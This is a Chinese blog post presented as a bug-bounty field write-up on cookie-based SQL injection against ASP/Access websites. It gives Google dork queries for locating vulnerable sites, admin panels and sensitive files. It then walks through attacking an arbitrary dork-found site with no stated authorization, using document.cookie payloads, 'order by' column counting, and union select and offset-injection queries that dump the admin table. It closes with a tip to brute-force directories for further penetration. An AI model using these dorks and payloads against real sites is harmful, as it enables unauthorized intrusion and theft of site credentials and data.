# 原创
：  SRC实战-cookie注入漏洞

# SRC实战-cookie注入漏洞

### 谷歌语法-信息收集

1.查找带有ID传参的网站（可以查找sql注入漏洞）<br/> inurl:asp id=xx<br/> 2.查找网站后台（多数有登陆框，可以查找弱口令，暴力破解等漏洞）<br/> site:http://xxxx.com “admin”<br/> site:http://xx.com intext:管理<br/> site:http://xx.com inurl:login<br/> site:http://xx.com intitle:后台<br/> 3.查看上传漏洞<br/> site:http://xx.com inurl:file<br/> site:http://xx.com inurl:load<br/> 4.查找敏感文件<br/> ﬁletype:mdb|doc|xlsx|pdf

### cookie注入

1、cookie注入：<br/> cookie相当于访问者的身份证,后端php代码中的$_REQUEST[]来获取你的cookie,网站会获取Cookie传参然后和原有的SQL语句拼接再传入数据库,传入了数据库这样我们就有机可乘了，我们可以修改cookie值进入数据库中进行sql注入<br/> Cookie注入在ASP网站中和低版本php中才会有，ASP常用的数据库是Accsess。

2、Access数据库：<br/> access有强大的数据处理、统计分析能力，利用access的查询功能，可以方便地进行各类汇总、平均等统计，并且access数据库无库名。<br/> access数据库在查询语句时和mysql不同，access比较严谨<br/> 所以要select 字段 from 表名<br/> 函数exists(select*from 表名)可以验证这个表名是否存在，这个表名还可以用burp来爆破

3、怎样修改cookie:<br/> 用burp抓包改<br/> 用插件改（需要自己编码一下）<br/> 阅览器自带js进行设置（document.cookie=’id=’+escape(“代码”)）

### 实战演示

##### 信息收集

通过谷歌语法查找带有asp文件下的id传参，发现有很多带有id=1传参的网站，可以挨个试一试，id传参数可以任意修改。<br/> 发现一家id=104的网站

##### SQL注入判断

废话不多说直接判断是否存在sql注入,and 1=2发现网站报错，但是1=1页面显示正常，说明存在sql注入
1.  `document.cookie='id='+escape("104 and 1=1")` 1.  `document.cookie='id='+escape("104 and 1=2")` 
##### 查找字段数

直接查找一下字段数，发现字段数为10
1.  `document.cookie='id='+escape("104 order by 10")` 
##### 爆破表名

因为这是一个ACCESS数据库，没有库名，所以我们可以使用burp爆破出表名,这里就不给大家展示了。
1.  `document.cookie='id='+escape("104 union select 1,2,3,4,5,6,7,8,9,10 from admin")` 
<br/> 发现存在admin表，且回显点是2和5

##### 输出结果

使用偏移注入查看admin表的字段数并且把表里的内容显示出来
1.  `document.cookie='id='+escape("104 union select 1,2,3,4,5,6,7,admin.* from admin")` 1.  `document.cookie='id='+escape("104 union select 1,2,3,admin.*,7,8,9,10 from admin")` 
### 总结

1.谷歌语法找到注入点<br/> 2.判断注入是否存在<br/> 3.通过cookie绕过注入<br/> 4.爆破表名<br/> 5.偏移注入查找表的字段数<br/> 6.最后可以通过爆破目录查找登陆框，进入后台进一步渗透拿权限<br/> 第一次投稿，觉得这次实战记录很适合新手小白挖SRC，希望多多支持！

 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
